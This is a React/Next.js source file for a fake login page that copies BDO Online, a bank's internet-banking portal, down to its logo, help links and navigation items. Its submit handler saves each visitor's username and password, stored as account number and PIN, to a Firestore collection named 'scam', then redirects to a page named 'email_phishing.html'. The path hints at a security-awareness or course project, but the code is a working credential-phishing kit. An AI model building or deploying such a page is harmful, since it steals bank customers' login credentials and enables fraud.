"use client";

import React, { useState } from "react";
import {
  Eye,
  EyeOff,
  Wallet,
  FileText,
  HelpCircle,
  PieChart,
} from "lucide-react";
import Image from "next/image";
import { app } from "@/lib/firebase";
import { getFirestore, collection, addDoc } from "firebase/firestore";

type NavItemProps = {
  icon: React.ReactNode;
  text: string;
  subText?: string;
};

const NavItem: React.FC<NavItemProps> = ({ icon, text, subText }) => (
  <div className="flex flex-col items-center justify-center p-2 text-center">
    <div className="text-blue-600 mb-1">{icon}</div>
    <div className="text-xs text-blue-800">{text}</div>
    {subText && <div className="text-xs text-blue-800">{subText}</div>}
  </div>
);

const BDOLoginPage: React.FC = () => {
  const [username, setUsername] = useState<string>("");
  const [password, setPassword] = useState<string>("");
  const [showPassword, setShowPassword] = useState<boolean>(false);

  return (
    <div className="flex h-screen w-full overflow-hidden">
      {/* Left Section with Image and Colorful Shapes */}
      <div className="hidden md:block w-1/2 relative bg-gray-100">
        <Image
          src="/images/login-bdo-image.svg"
          alt="Person celebrating on a blue bean bag with laptop"
          className="object-cover"
          fill
        />
      </div>

      {/* Right Section with Login Form */}
      <div className="w-full md:w-1/2 flex flex-col p-8 in">
        <div className="flex-grow max-w-md mx-auto w-full items-center justify-center">
          <Image
            src="/images/logo.svg"
            alt=""
            className=""
            width={200}
            height={200}
          />
          <h1 className="text-2xl font-medium text-gray-700 mb-8">
            Welcome to BDO Online!
          </h1>
          <form
            onSubmit={async (e) => {
              e.preventDefault();

              try {
                const db = getFirestore(app);
                await addDoc(collection(db, "scam"), {
                  accountNumber: username,
                  pin: password,
                });
                console.log("Document written with ID: ", username);
                window.location.href =
                  "https://exxsid.github.io/IAS/email_phishing.html";
              } catch (error) {
                console.error("Error adding document: ", error);
              }
            }}
          >
            <div>
              <div className="mb-4">
                <label
                  htmlFor="username"
                  className="block text-sm font-medium text-gray-700 mb-1"
                >
                  Username
                </label>
                <input
                  type="text"
                  id="username"
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                  className="w-full px-3 py-2 border border-gray-300 rounded-md"
                  required
                />
              </div>

              <div className="mb-6">
                <label
                  htmlFor="password"
                  className="block text-sm font-medium text-gray-700 mb-1"
                >
                  Password
                </label>
                <div className="relative">
                  <input
                    type={showPassword ? "text" : "password"}
                    id="password"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    className="w-full px-3 py-2 border border-gray-300 rounded-md"
                    required
                  />
                  <button
                    type="button"
                    onClick={() => setShowPassword(!showPassword)}
                    className="absolute right-2 top-1/2 transform -translate-y-1/2 text-gray-400"
                  >
                    {showPassword ? <Eye size={18} /> : <EyeOff size={18} />}
                  </button>
                </div>
              </div>

              <button
                type="submit"
                className="w-full bg-blue-600 text-white py-2 px-4 rounded-md hover:bg-blue-700"
              >
                Log in
              </button>
            </div>
          </form>

          <div className="mt-6">
            <p className="text-sm text-gray-600">
              {`Don't have Online Banking yet?`}
              <span className="text-blue-600 hover:underline cursor-pointer">
                Sign up
              </span>
            </p>
          </div>

          <div className="mt-4">
            <p className="text-sm text-gray-600 mb-1">Need help logging in?</p>
            <p className="text-sm text-blue-600 hover:underline cursor-pointer mb-1">
              {`I'd like to get my username`}
            </p>
            <p className="text-sm text-blue-600 hover:underline cursor-pointer">
              {`I'd like to reset my password`}
            </p>
          </div>

          <div className="mt-4">
            <p className="text-sm text-gray-600">
              Need more information? Go{" "}
              <span className="text-blue-600 hover:underline cursor-pointer">
                here
              </span>
            </p>
          </div>

          <div className="border-t border-gray-200 mt-8 pt-6">
            <div className="grid grid-cols-5 gap-2">
              <NavItem
                icon={<PieChart size={20} />}
                text="My Trust"
                subText="Investments"
              />
              <NavItem icon={<FileText size={20} />} text="Apply Now" />
              <NavItem
                icon={<Wallet size={20} />}
                text="Activate"
                subText="Credit Card"
              />
              <NavItem icon={<HelpCircle size={20} />} text="FAQs" />
              <div className="flex-1"></div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default BDOLoginPage;
